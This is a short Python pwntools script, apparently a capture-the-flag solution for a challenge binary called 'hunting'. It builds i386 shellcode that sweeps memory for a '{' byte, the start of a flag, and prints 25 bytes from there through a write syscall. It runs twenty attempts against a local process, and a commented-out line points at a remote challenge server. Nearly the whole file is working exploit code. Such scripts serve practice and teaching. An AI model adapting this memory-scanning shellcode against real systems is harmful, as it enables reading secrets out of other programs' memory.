#!/usr/bin/python3

from pwn import *
from htools import *
import struct
import sys

target = './hunting'
seed = './seed'
def mov32(dst, src):
    return shellcraft.i386.mov(dst, src)
def sys32():
    return shellcraft.i386.syscall()

context.log_level = 'error'


for i in range (0,20):
    #p = remote('167.99.85.197',32574)
    p = process(target)
    p.clean()
    p = process(target, stdin=PTY)
    pl = asm("xor eax, eax")
    pl += asm("mov al, 0x7b")
    pl += asm("mov edi, 0x60000000")
    pl += asm("mov ecx, 0x90000000")
    pl += asm("repz scasb")
    pl += asm("mov eax, 4")
    pl += asm("mov ecx, edi")
    pl += asm("mov ebx, 1")
    pl += asm("mov edx, 25")
    pl += asm("int 0x80")
    #pl += asm("ret")
    p.send(pl)
    data = p.recvall()
    print(data)
    p.close()


